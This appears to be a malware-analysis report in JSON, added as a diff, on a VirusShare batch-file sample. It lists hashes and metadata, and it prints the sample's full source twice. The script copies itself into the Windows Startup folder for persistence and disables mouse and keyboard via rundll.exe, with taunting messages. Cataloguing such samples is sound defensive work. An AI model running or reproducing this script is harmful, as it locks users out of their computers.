@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif exist C:\\windows\\Startm~1\\Programs\\StartUp\\nul goto win98\nif exist C:\\winnt\\Startm~1\\Programs\\StartUp\\nul goto winnt\n:win98\ncopy %0 c:\\windows\\startm~1\\programs\\startup\nc:\\windows\\rundll.exe mouse,disable\nc:\\windows\\rundll.exe keyboard,disable\ngoto end\n:winnt\ncopy %0 C:\\winnt\\Startm~1\\Programs\\StartUp\\\nc:\\windows\\rundll.exe mouse,disable\nc:\\windows\\rundll.exe keyboard,disable\ngoto end\n:end\necho You cant stop me now!\necho Restarting wont work either I all ready took care of that!\necho Bahahahahahahahahahahahahaha your screwed!!!\nexit "
+    },
+    "filename": "VirusShare_3a3475b8903ae39073a422b7ad91333b",
+    "filesize": 569,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3a3475b8903ae39073a422b7ad91333b",
+        "sha1": "441dce54476b1a1ddf175323a1fb5b273073d6c7",
+        "sha256": "e0ad47788590c5cf560a0d8b65307cc1c4f104e45e1bdd82f337f07e752ce9fc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist C:\\windows\\Startm~1\\Programs\\StartUp\\nul goto win98",
+            "if exist C:\\winnt\\Startm~1\\Programs\\StartUp\\nul goto winnt",
+            ":win98",
+            "copy %0 c:\\windows\\startm~1\\programs\\startup",
+            "c:\\windows\\rundll.exe mouse,disable",
+            "c:\\windows\\rundll.exe keyboard,disable",
+            "goto end",
+            ":winnt",
+            "copy %0 C:\\winnt\\Startm~1\\Programs\\StartUp\\",
+            "c:\\windows\\rundll.exe mouse,disable",
+            "c:\\windows\\rundll.exe keyboard,disable",
+            "goto end",
+            ":end",
+            "echo You cant stop me now!",
+            "echo Restarting wont work either I all ready took care of that!",
+            "echo Bahahahahahahahahahahahahaha your screwed!!!",
+            "exit "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.285493",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
